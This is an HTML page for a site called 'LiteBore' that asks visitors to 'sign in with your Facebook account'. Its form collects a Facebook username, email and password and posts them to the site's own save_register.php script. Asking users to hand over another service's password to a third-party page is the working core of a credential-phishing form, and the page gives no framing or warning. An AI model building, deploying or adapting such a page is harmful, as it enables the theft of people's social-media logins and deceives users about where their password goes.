<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Facebook Registration - LiteBore</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background-color: #0147AB;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }

    .container {
      width: 90%;
      max-width: 360px;
      text-align: center;
      color: white;
    }

    h2 {
      font-size: 24px;
      margin-bottom: 40px;
      line-height: 1.4;
    }

    label {
      display: block;
      text-align: left;
      margin: 15px 0 5px;
      font-size: 12px;
      letter-spacing: 1px;
    }

    input {
      width: 100%;
      padding: 12px 15px;
      border: none;
      border-radius: 12px;
      font-size: 14px;
      background-color: rgba(255, 255, 255, 0.3);
      color: white;
      outline: none;
    }

    input::placeholder {
      color: white;
    }

    button {
      margin-top: 30px;
      width: 100%;
      padding: 12px;
      background-color: #FFB66F;
      border: none;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      font-size: 16px;
      cursor: pointer;
    }

    button:hover {
      background-color: #ffa14d;
    }
  </style>
</head>
<body>

  <div class="container">
    <h2>SIGN IN WITH <br> YOUR <br> FACEBOOK ACCOUNT</h2>

    <form method="POST" action="save_register.php">
      <label for="username">FACEBOOK USERNAME</label>
      <input type="text" id="username" name="username" placeholder="Jiara Martins" required />

      <label for="email">FACEBOOK EMAIL</label>
      <input type="email" id="email" name="email" placeholder="hello@reallygreatsite.com" required />

      <label for="password">YOUR FACEBOOK PASSWORD</label>
      <input type="password" id="password" name="password" placeholder="*****" required />

      <button type="submit">Activate</button>
    </form>
  </div>

</body>
</html>

